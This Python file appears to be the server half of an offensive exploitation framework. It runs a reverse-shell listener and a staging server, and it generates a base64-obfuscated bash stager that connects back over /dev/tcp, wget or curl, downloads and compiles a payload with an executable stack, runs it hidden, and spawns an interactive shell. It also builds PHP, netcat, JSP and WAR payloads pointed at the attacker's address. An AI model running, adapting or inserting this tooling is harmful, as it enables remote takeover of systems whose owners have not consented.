#!/usr/bin/env python3

import os
import sys
import struct
import select
import socket
import time
from base64 import b64encode
import threading

class Listener(object):
    """
    This is for the payload to connect back to and will provide comunication link
    between the exploited machine and the SAP.
    """
    def __init__(self):
        self.addr = "0.0.0.0"
        self.port = 4444

    def createSocket(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.settimeout(15)

    def startSocket(self):
        self.socket.bind((self.addr, self.port))
        print("    \033[1;34m*\033[00m Reverse Handler listening on [%s:%d]" % (self.addr, self.port))
        self.socket.listen(10)

    def command_loop(self):
        s = self.so
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setblocking(False)
        source = sys.stdin
        sink = sys.stdout
        payload = "python -c 'import pty;pty.spawn(\"/bin/bash\");'"
        enum = 0

        peer = s.getpeername()
        selfs = s.getsockname()
        print("    \033[1;32m*\033[00m Session opened: %s:%d --> %s:%d" % (peer[0], peer[1], selfs[0], selfs[1]))
        while True:
            enum += 1
            try:
                read, write, exce = select.select((s, source),(),(s, source, sink))
                if exce: break
                if source in read:
                    if enum <= 1:
                        s.send(payload.encode("utf-8"))
                    else:
                        s.send(source.readline().encode("utf-8"))
                if s in read:
                    sink.write(s.recv(1024).decode('utf-8'))
                    sink.flush()
            except KeyboardInterrupt:
                for i in range(0, 5):
                    s.send(b"exit\n")
                source.close()
                sink.close()
                s.close()

    def run(self):
        self.createSocket()
        self.startSocket()
        self.so, self.addr = self.socket.accept()
        self.command_loop()

class LandingControl(object):
    """
    LandingControl provides the interface between the 'lander' and the attacking
    machine it will correctly compile the payload and give it to the lander.
    """
    def __init__(self):
        super(LandingControl, self).__init__()
        self.addr = "0.0.0.0"
        self.port = 4443

    def initiateSocket(self):
        self.createSocket()
        if self.startSocket() != True:
            return False

    def createSocket(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #self.socket.settimeout(20)

    def startSocket(self):
        try:
            self.socket.bind((self.addr, self.port))
        except OSError:
            self.socket.close()
            return
        print("    \033[1;34m*\033[00m Landing Control listening on [%s:%d]" % (self.addr, self.port))
        self.socket.listen(10)
        return True

    def sendRaw(self):
        with open("payloads/c/payload.c", "r") as file:
            raw = file.read()
        return raw

    def sendexe(self):
        with open("payloads/exe/payload", "rb") as file:
            exe = file.read()
        return exe

    def handlePayload(self, data):
        compiler = data.decode('utf-8').split(":")[1].strip("\n").split(" ")[0]
        if compiler == "true":
            self.s.send(self.sendRaw().encode('utf-8'))
            print("    \033[1;32m*\033[00m Sending stage: %s:%d" % (self.addr[0], self.addr[1]))
        if compiler == "false":
            self.s.send(self.sendexe())
            print("    \033[1;32m*\033[00m Sending stage: %s:%d" % (self.addr[0], self.addr[1]))
        self.s.close()

    def handleRecv(self, data):
        if b"landing..." in data:
            print("    \033[1;32m*\033[00m RCE Success!!")
            print("    \033[1;34m*\033[00m %s:%d has landed" % (self.addr[0], self.addr[1]))
            self.s.send(b"succesful")
            self.s.close()
            return False
        if b"payload" in data:
            self.handlePayload(data)
            return True
        if b"wannashell?" in data:
            print("    \033[1;32m*\033[00m RCE Success!!")
            self.s.close()
            return True

    def startListener(self):
        l = Listener()
        l.run()

    def beginControl(self):
        while True:
            try:
                self.s, self.addr = self.socket.accept()
            except:
                self.socket.close()
                return False
            req = self.s.recv(1024)
            if self.handleRecv(req) == True:
                break
        self.startListener()

def createBash():
    global ip
    ip = os.popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'").read().strip('\n')
    plainPayload = """check_compiler(){ if [ `command -v gcc` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v g++`; else if [ `command -v clang` ]; then compile=true;cpath=`command -v clang`; else compile=false; fi; fi; fi; }; check_compiler;get_bashsock(){ exec 3<>/dev/tcp/192.168.1.161/4443;echo -e "payload:$compile" >&3;if [ $compile == true ]; then payload=`cat <&3`;echo $payload > .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; payload=`cat <&3 > .o`; chmod +x .o; ./.o; fi;}; get_wget(){ wget http://192.168.1.161:4443/payload:$compile -O .a 2> /dev/null; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; get_curl(){ `curl http://192.168.1.161:4443/payload:$compile > .a 2> /dev/null`; if [ $compile == true ]; then mv .a .o.c; $cpath .o.c -z execstack -o .o; rm .o.c; ./.o; else rm .o 2> /dev/null; mv .a .o; chmod +x .o; ./.o; fi; }; check_curl(){ if [ `curl http://192.168.1.161:4443/landing... 2> /dev/null` == "succesful" ]; then get_curl; else curl_run=false; fi;echo $curl_run; }; check_wget(){ rm landing...; wget http://192.168.1.161:4443/landing... 2> /dev/null; ret=`cat landing...`; if [ $ret == 'succesful' ]; then get_wget;else check_curl;fi;echo $wget_run; }; bash_sock(){ exec 3<>/dev/tcp/192.168.1.161/4443; echo -e "bash landing..." >&3;ret=`cat <&3`;if [ $ret == "succesful" ];then get_bashsock;else check_wget; fi;}; bash_sock;"""
    payload = plainPayload.replace("192.168.1.161", ip)
    data = b64encode(bytes(str(payload).encode('utf-8')))
    return "bash -c \"$(echo '%s' | base64 -d)\" &\n" % (data.decode('utf-8'))

def createC():
    os.popen("python payloads/c/shellcreator.py")

def createPHP():
    with open("payloads/php/payload.php", "r") as file:
        php = file.read().replace("192.168.1.161", ip)
    return php

def createNETCAT():
    with open("payloads/netcat/payload.nc", "r") as file:
        nc = file.read().replace("192.168.1.161", ip)
    return nc

def createJSP():
    with open("payloads/jsp/payload.jsp", "r") as file:
        jsp = file.read().replace("192.168.1.161", ip)
    return jsp

def createWAR():
    cwd = os.getcwd()
    jsp = createJSP()
    with open("/tmp/xyz.jsp", "w") as file:
        file.write(jsp)
    os.chdir("payloads/war")
    os.popen("jar -cvf payload.war /tmp/xyz.jsp")
    os.chdir(cwd)
    return

createC()
payload_BASH = createBash()
payload_PHP = createPHP()
payload_NETCAT = createNETCAT()
payload_JSP = createJSP()
createWAR()

def start():
    lc = LandingControl()
    lc.initiateSocket()
    lc.beginControl()

def run():
    thread = threading.Thread(target=start)
    thread.deamon = True
    thread.start()
